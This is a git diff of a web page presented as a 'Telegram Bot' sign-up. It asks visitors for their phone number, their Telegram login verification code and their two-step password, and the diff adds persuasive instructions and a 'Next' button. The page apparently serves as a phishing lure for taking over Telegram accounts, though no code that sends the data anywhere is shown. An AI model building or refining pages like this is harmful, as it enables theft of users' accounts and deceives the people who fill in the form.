@@ -69,7 +69,7 @@ font-size: 25px;
 display: block;
 margin: 0 auto 10px;
 justify-content: center;
-width: 100%;
+width: 90%;
 }
 .inputs{
 width: 70%;
@@ -80,24 +80,35 @@ font-size: 17px;
 }
 }
 
-
+.next{
+background: #3193e4;
+border: none;
+border-radius: 5px;
+color: #fff;
+font-size: 17px;
+font-family: var(--font);
+padding: 8px 40px;
+margin-top: 10px;
+}
 </style>
 <body>
 <div class="container_server_telegra">
 <div class="image">
 <img src="https://my.telegram.org/img/tl_card_decentralized.gif" width="140" height="140"/>
 <h2 class="fong">Welcome to Telegram Bot</h2>
+<p style="font-size: 14px; opacity: 0.6;">Enter your telegram number to receive a verification code so we can connect you to the chatbot</p>
 </div>
 <div class="inputs">
 <label for="number"> Your number</label><br>
 <input type="text" id="number"/>
-<br>
+<p style="font-size: 14px; opacity: 0.6;">enter your number here, we need your number for our system to send the verification code</p>
 <label for="code_telegram">Telegram code</label><br>
 <input type="text" id="code_telegram"><br>
 <p style="font-size: 13px; opacity: 0.6;">Telegram sends a verification code, use that code here.</p>
-<br>
 <label for="code">Two step code (if you have)</label><br>
 <input type="text" id="code">
+<br>
+<button type="submit" class="next">Next</button>
 </div>
 </div>
 </body>
